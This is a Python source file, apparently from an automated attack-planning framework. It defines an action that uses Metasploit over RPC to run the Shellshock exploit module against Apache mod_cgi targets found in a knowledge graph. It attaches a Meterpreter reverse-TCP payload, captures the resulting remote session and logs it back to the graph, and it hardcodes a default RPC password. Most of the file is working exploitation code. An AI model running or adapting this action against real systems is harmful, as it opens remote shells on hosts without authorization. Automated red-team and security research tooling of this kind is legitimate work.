# noqa
import os
import re
from typing import Any, Union

from pymetasploit3.msfrpc import MsfRpcClient

from action_state_interface.action import StateChangeSequence
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult
from action_state_interface.metasploit_exploit_actions import ExploitAction
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from Session import SessionManager


class MsfMultiHttpExploitApacheModCgiBashEnvExec(ExploitAction):
    """MsfMultiHttpExploitApacheModCgiBashEnvExec"""

    def __init__(self):
        super().__init__("MsfMultiHttpExploitApacheModCgiBashEnvExec")

    noise = 0.8
    impact = 0.1

    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        General implementation for msf exploits
        """
        service = Entity('Service', alias='service', protocol="http")
        asset = Entity('Asset', alias='asset')
        uri = Entity('Directory', alias='uri')

        pattern = (
            asset.with_edge(Relationship('has', direction='r'))
            .with_node(Entity('OpenPort', alias='openport'))
            .with_edge(Relationship('is_running', direction='r'))
            .with_node(service)
            .directed_path_to(uri)
        )
        return kg.get_matching(pattern, path=True)

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute the exploit against the target.
        """
        msf_password = os.environ.get("MSFRPCD_PASSWORD", "tulpaOSApass24")
        msf_port = int(os.environ.get("MSF_PORT", 55552))
        msf = MsfRpcClient(msf_password, port=msf_port)

        exploit = msf.modules.use("exploit", "multi/http/apache_mod_cgi_bash_env_exec")

        host = pattern.get('asset').get('ip_address')
        exploit['RHOSTS'] = host
        port = pattern.get('openport').get('number')
        exploit['RPORT'] = port

        uri = "/"
        for link in pattern._patterns[0]._path:
            if link.type == 'Directory':
                uri += link.get('dirname') + "/"
        exploit['TARGETURI'] = uri

        payload = msf.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
        output = msf.consoles.console().run_module_with_output(exploit, payload=payload)

        matches = re.search(r'session (\d+) opened', output.lower().strip())
        if matches:
            ms_session_id = matches.group(1)
            channel = msf.sessions.session(ms_session_id)
            sess_id = sessions.add_session(channel)
            return ActionExecutionResult(
                command=["msf", "exploit", "multi/http/apache_mod_cgi_bash_env_exec"],
                stdout=output,
                session=sess_id,
                exit_status=0,
            )
        else:
            raise ActionExecutionError(
                f"Couldn't create a session on {host} using msf exploit {exploit}, output: {output}"
            )

    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: Any
    ) -> StateChangeSequence:
        """
        Update knowledge graph with newly established session.
        """
        host = pattern.get('asset')
        executes_on = host._id

        openport = pattern.get('openport')
        service = pattern.get('service')
        if service:
            executes_on = service._id
        elif openport:
            executes_on = openport._id

        session = Entity(
            'Session',
            alias='session',
            protocol='msf',
            active=True,
            id=output.session,
            executes_on=executes_on,
        )
        changes: StateChangeSequence = [(None, "merge", session)]
        return changes

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        uri = "/"
        for link in pattern._patterns[0]._path:
            if link.type == 'Directory':
                uri += link.get('dirname') + "/"
        return [
            f'Execute metasploit exploit multi/http/apache_mod_cgi_bash_env_exec on the URI {uri} against port {pattern.get("openport").get("number")} on {pattern.get("asset").get("ip_address")}'
        ]